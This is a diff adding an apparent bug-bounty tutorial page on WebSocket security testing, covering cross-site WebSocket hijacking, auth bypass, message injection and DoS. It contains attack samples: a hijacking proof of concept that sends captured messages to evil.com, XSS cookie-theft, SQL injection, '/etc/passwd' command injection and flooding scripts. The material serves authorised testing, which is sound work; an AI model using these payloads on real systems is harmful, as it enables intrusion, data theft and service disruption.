@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Test WebSocket implementations for hijacking, message injection, and cross-site WebSocket attacks. Covers authentication flaws, origin validation, and real-time exploitation.">
+    <title>WebSocket Security Testing: Hijacking, Injection, and Cross-Site WebSocket Attacks</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/websocket-security-testing-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/websocket-security-testing-bug-bounty-guide-2026/">
+    <meta property="og:title" content="WebSocket Security Testing: Hijacking, Injection, and Cross-Site WebSocket Attacks">
+    <meta property="og:description" content="Test WebSocket implementations for hijacking, message injection, and cross-site WebSocket attacks. Covers authentication flaws, origin validation, and real-time exploitation.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/websocket-security-testing-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="WebSocket Security Testing: Hijacking, Injection, and Cross-Site WebSocket Attacks">
+    <meta name="twitter:description" content="Test WebSocket implementations for hijacking, message injection, and cross-site WebSocket attacks. Covers authentication flaws, origin validation, and real-time exploitation.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "WebSocket Security Testing: Hijacking, Injection, and Cross-Site WebSocket Attacks",
+      "description": "Test WebSocket implementations for hijacking, message injection, and cross-site WebSocket attacks. Covers authentication flaws, origin validation, and real-time exploitation.",
+      "url": "https://bughuntertools.com/articles/websocket-security-testing-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">WebSocket Security Testing: Hijacking, Injection, and Cross-Site WebSocket Attacks</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<div class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li>WebSocket connections often lack the authentication and authorization checks applied to REST endpoints</li>
+<li>Cross-Site WebSocket Hijacking (CSWSH) is the WebSocket equivalent of CSRF — and it's frequently exploitable</li>
+<li>Message injection through WebSockets can lead to XSS, SQL injection, and command injection just like HTTP parameters</li>
+<li>Most WAFs don't inspect WebSocket traffic, making it a blind spot for defenders</li>
+<li>Burp Suite, OWASP ZAP, and browser DevTools are your primary interception tools</li>
+</ul>
+</div>
+
+<h2>Why WebSocket Security Testing Matters for Bug Bounty</h2>
+
+<p>WebSockets are everywhere — chat apps, trading platforms, dashboards, collaborative editors, notification systems. They maintain persistent bidirectional connections, which means they bypass many of the protections that HTTP request/response cycles enforce naturally. Most bug bounty hunters skip WebSocket endpoints entirely because their tools don't intercept them by default. That's exactly why they're worth testing.</p>
+
+<h2>How WebSockets Differ from HTTP</h2>
+
+<p>The WebSocket handshake starts as an HTTP <code>Upgrade</code> request:</p>
+
+<pre><code>GET /ws/chat HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Origin: https://target.com
+Cookie: session=abc123</code></pre>
+
+<p>After the server responds with <code>101 Switching Protocols</code>, the connection becomes a persistent full-duplex channel. Key security implications:</p>
+
+<ul>
+<li><strong>No per-message authentication</strong> — the initial handshake authenticates once, then all subsequent messages flow without re-verification</li>
+<li><strong>No CORS enforcement</strong> — the <code>Origin</code> header is sent but the server must validate it manually</li>
+<li><strong>No automatic CSRF tokens</strong> — browsers send cookies with the upgrade request, but there's no built-in CSRF protection</li>
+<li><strong>Stateful connections</strong> — server-side state can be manipulated through message sequences</li>
+</ul>
+
+<h2>Finding WebSocket Endpoints</h2>
+
+<ol>
+<li><strong>Browser DevTools</strong> → Network tab → filter by "WS" — watch for WebSocket connections during normal app usage</li>
+<li><strong>Burp Suite</strong> → WebSockets history tab — captures all WS traffic through the proxy</li>
+<li><strong>Source code search</strong> — grep JavaScript for <code>new WebSocket(</code>, <code>ws://</code>, <code>wss://</code>, <code>socket.io</code>, <code>SockJS</code></li>
+<li><strong>Common paths</strong>: <code>/ws</code>, <code>/websocket</code>, <code>/socket.io</code>, <code>/sockjs</code>, <code>/cable</code> (ActionCable), <code>/hub</code> (SignalR)</li>
+</ol>
+
+<h2>Cross-Site WebSocket Hijacking (CSWSH)</h2>
+
+<p>This is the highest-impact WebSocket vulnerability and the one most commonly found in bounties. It's the WebSocket equivalent of CSRF.</p>
+
+<h3>How It Works</h3>
+
+<p>When a browser opens a WebSocket connection, it sends cookies automatically — just like any HTTP request. If the server relies solely on cookies for authentication and doesn't validate the <code>Origin</code> header, an attacker's page can open a WebSocket to the target and interact with it as the victim.</p>
+
+<h3>Testing for CSWSH</h3>
+
+<ol>
+<li>Identify a WebSocket endpoint that uses cookie-based authentication</li>
+<li>Check if the server validates the <code>Origin</code> header:</li>
+</ol>
+
+<pre><code>// Attacker's page (hosted on evil.com)
+const ws = new WebSocket('wss://target.com/ws/chat');
+
+ws.onopen = () => {
+  console.log('Connected — CSWSH likely exploitable');
+  ws.send(JSON.stringify({action: 'get_messages'}));
+};
+
+ws.onmessage = (event) => {
+  // Exfiltrate data
+  fetch('https://evil.com/log', {
+    method: 'POST',
+    body: event.data
+  });
+};</code></pre>
+
+<p>If the connection succeeds from a different origin, the endpoint is vulnerable.</p>
+
+<h3>What to Check</h3>
+
+<ul>
+<li>Does the server reject connections with mismatched <code>Origin</code>?</li>
+<li>Does the server require a CSRF token in the handshake URL or first message?</li>
+<li>Does the server use a non-cookie authentication mechanism (e.g., token in URL parameter)?</li>
+</ul>
+
+<h3>Impact Escalation</h3>
+
+<ul>
+<li><strong>Data exfiltration</strong> — read private messages, account data, notifications</li>
+<li><strong>Action on behalf of user</strong> — send messages, change settings, make purchases</li>
+<li><strong>Account takeover</strong> — if the WebSocket exposes session tokens or allows password changes</li>
+</ul>
+
+<h2>Authentication and Authorization Bypass</h2>
+
+<h3>Missing Authentication on WebSocket Endpoints</h3>
+
+<p>Many applications authenticate the HTTP endpoints but forget to authenticate the WebSocket upgrade:</p>
+
+<pre><code># Test: Can you connect without any cookies/tokens?
+websocat wss://target.com/ws/admin --no-close</code></pre>
+
+<p>If the connection succeeds and you receive data, the endpoint lacks authentication entirely.</p>
+
+<h3>Broken Authorization Between Channels</h3>
+
+<p>Applications with multi-tenant WebSocket systems often fail to enforce authorization:</p>
+
+<pre><code>// Subscribe to another user's channel
+{"action": "subscribe", "channel": "user_notifications_12345"}
+
+// Join another user's room
+{"action": "join", "room": "private_room_admin"}</code></pre>
+
+<p>Test by connecting as User A, attempting to subscribe to User B's channels/rooms, and sending messages to channels you shouldn't have access to.</p>
+
+<h3>Token Leakage in WebSocket URLs</h3>
+
+<p>Some implementations pass auth tokens in the WebSocket URL:</p>
+
+<pre><code>wss://target.com/ws?token=eyJhbGciOiJIUzI1NiJ9...</code></pre>
+
+<p>This token appears in server access logs, proxy logs, browser history, and referrer headers if the page links elsewhere.</p>
+
+<h2>Message Injection Attacks</h2>
+
+<p>WebSocket messages are just data — if the server processes them without sanitization, all the classic injection attacks apply.</p>
+
+<h3>XSS Through WebSocket Messages</h3>
+
+<p>If WebSocket messages are rendered in the DOM without escaping:</p>
+
+<pre><code>{"type": "chat", "message": "&lt;img src=x onerror=alert(document.cookie)&gt;"}</code></pre>
+
+<p>This is especially common in chat applications, collaborative editing tools, real-time notification displays, and dashboard widgets that render user-supplied data.</p>
+
+<h3>SQL Injection Through WebSocket Messages</h3>
+
+<pre><code>{"action": "search", "query": "test' OR 1=1--"}
+{"action": "get_user", "id": "1 UNION SELECT username,password FROM users--"}</code></pre>
+
+<h3>Server-Side Template Injection</h3>
+
+<pre><code>{"action": "render_preview", "template": "&#123;&#123;7*7&#125;&#125;"}
+{"action": "set_name", "name": "${7*7}"}</code></pre>
+
+<h3>Command Injection</h3>
+
+<pre><code>{"action": "ping", "host": "127.0.0.1; cat /etc/passwd"}</code></pre>
+
+<h2>Rate Limiting and DoS</h2>
+
+<p>WebSocket connections often lack rate limiting because they bypass the HTTP request pipeline.</p>
+
+<h3>Message Flooding</h3>
+
+<pre><code>import websocket
+import json
+
+ws = websocket.create_connection("wss://target.com/ws")
+
+for i in range(10000):
+    ws.send(json.dumps({"action": "search", "query": f"test{i}"}))</code></pre>
+
+<h3>Connection Exhaustion</h3>
+
+<pre><code>connections = []
+for i in range(1000):
+    try:
+        ws = websocket.create_connection("wss://target.com/ws")
+        connections.append(ws)
+    except:
+        print(f"Server stopped accepting at connection {i}")
+        break</code></pre>
+
+<p>If the server doesn't limit concurrent connections per IP or per user, this can cause denial of service.</p>
+
+<h2>Smuggling and Protocol-Level Attacks</h2>
+
+<h3>WebSocket Smuggling</h3>
+
+<p>Some reverse proxies handle WebSocket upgrades incorrectly, allowing request smuggling. Send a valid WebSocket upgrade request, then after the upgrade, send HTTP requests through the WebSocket tunnel. These requests may bypass proxy-level security controls (WAF, IP restrictions, authentication).</p>
+
+<h3>Downgrade Attacks</h3>
+
+<p>If the application supports both <code>ws://</code> and <code>wss://</code>, all traffic on <code>ws://</code> is plaintext — credentials, tokens, and messages are exposed to network-level attackers.</p>
+
+<h2>Socket.IO and Framework-Specific Testing</h2>
+
+<h3>Socket.IO</h3>
+
+<p>Socket.IO is the most common WebSocket framework. It has its own protocol layer:</p>
+
+<pre><code>// Socket.IO handshake (HTTP long-polling first, then upgrade)
+GET /socket.io/?EIO=4&amp;transport=polling
+GET /socket.io/?EIO=4&amp;transport=websocket&amp;sid=&lt;session_id&gt;</code></pre>
+
+<p>Test for:</p>
+<ul>
+<li><strong>Event injection</strong> — emit events you shouldn't have access to: <code>socket.emit('admin_action', {cmd: 'delete_user', id: 1})</code></li>
+<li><strong>Namespace access</strong> — connect to admin namespaces: <code>io('/admin')</code></li>
+<li><strong>Room enumeration</strong> — attempt to join rooms by guessing names</li>
+</ul>
+
+<h3>SignalR</h3>
+
+<pre><code>// SignalR negotiation
+POST /hub/negotiate?negotiateVersion=1
+// Then WebSocket upgrade to /hub?id=&lt;connection_id&gt;</code></pre>
+
+<p>Test for:</p>
+<ul>
+<li><strong>Method invocation</strong> — call server methods you shouldn't: <code>{"type":1,"target":"AdminMethod","arguments":["data"]}</code></li>
+<li><strong>Stream interception</strong> — subscribe to streams meant for other users</li>
+</ul>
+
+<h2>Tools and Setup</h2>
+
+<h3>Burp Suite</h3>
+<ul>
+<li>WebSockets history tab shows all WS messages</li>
+<li>You can intercept and modify individual messages</li>
+<li>Use the Repeater to replay modified messages</li>
+<li>Extensions: "WebSocket Turbo Intruder" for fuzzing</li>
+</ul>
+
+<h3>OWASP ZAP</h3>
+<ul>
+<li>WebSocket tab captures and displays messages</li>
+<li>Can fuzz WebSocket parameters</li>
+<li>Supports breakpoints on WebSocket messages</li>
+</ul>
+
+<h3>websocat</h3>
+
+<p>Command-line WebSocket client — essential for scripted testing:</p>
+
+<pre><code># Connect and interact
+websocat wss://target.com/ws
+
+# With custom headers
+websocat -H "Cookie: session=abc123" wss://target.com/ws
+
+# Pipe input
+echo '{"action":"test"}' | websocat wss://target.com/ws</code></pre>
+
+<h2>Testing Methodology Checklist</h2>
+
+<ol>
+<li><strong>Discovery</strong> — Find all WebSocket endpoints (DevTools, source code, common paths)</li>
+<li><strong>Authentication</strong> — Test if connections work without credentials</li>
+<li><strong>Origin validation</strong> — Test CSWSH by connecting from a different origin</li>
+<li><strong>Authorization</strong> — Test cross-user channel/room access</li>
+<li><strong>Input validation</strong> — Fuzz message parameters for XSS, SQLi, command injection</li>
+<li><strong>Rate limiting</strong> — Test message flooding and connection exhaustion</li>
+<li><strong>Encryption</strong> — Check if <code>ws://</code> (unencrypted) is accepted alongside <code>wss://</code></li>
+<li><strong>Token handling</strong> — Check for tokens in URLs, message leakage</li>
+<li><strong>Framework-specific</strong> — Test Socket.IO namespaces, SignalR methods, ActionCable channels</li>
+</ol>
+
+<h2>Writing the Report</h2>
+
+<h3>Title Format</h3>
+
+<p>"Cross-Site WebSocket Hijacking on /ws/chat Allows Reading Private Messages of Any User"</p>
+
+<h3>Key Elements</h3>
+
+<ul>
+<li><strong>Endpoint</strong>: The exact WebSocket URL</li>
+<li><strong>Authentication mechanism</strong>: How the WebSocket authenticates (cookies, tokens, none)</li>
+<li><strong>Vulnerability</strong>: What's broken (missing origin check, no auth, injection)</li>
+<li><strong>PoC</strong>: Working HTML page or script that demonstrates the issue</li>
+<li><strong>Impact</strong>: What an attacker can do — data access, actions, account takeover</li>
+<li><strong>Affected users</strong>: All users, specific roles, specific features</li>
+</ul>
+
+<h3>CVSS Considerations</h3>
+
+<ul>
+<li>CSWSH with data exfiltration: typically High (7.0-8.9)</li>
+<li>Missing authentication on sensitive endpoints: Critical (9.0+) if it exposes PII or allows account actions</li>
+<li>XSS through WebSocket: same as reflected/stored XSS rating, but note the WAF bypass angle</li>
+<li>Rate limiting issues: typically Low-Medium unless it causes actual service disruption</li>
+</ul>
+
+<p><em>Related reading: <a href="/articles/bug-bounty-recon-workflow-2026/">Bug Bounty Recon Workflow in 2026</a>, <a href="/articles/xss-hunting-bug-bounty-guide-2026/">XSS Hunting for Bug Bounty in 2026</a>, <a href="/articles/ssrf-hunting-bug-bounty-guide-2026/">SSRF Hunting for Bug Bounty in 2026</a>, <a href="/articles/authentication-bypass-bug-bounty-guide-2026/">Authentication Bypass for Bug Bounty in 2026</a>, <a href="/articles/http-request-smuggling-bug-bounty-guide-2026/">HTTP Request Smuggling for Bug Bounty in 2026</a>, <a href="/articles/api-security-testing-10-checks-2026/">API Security Testing in 2026</a></em></p>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
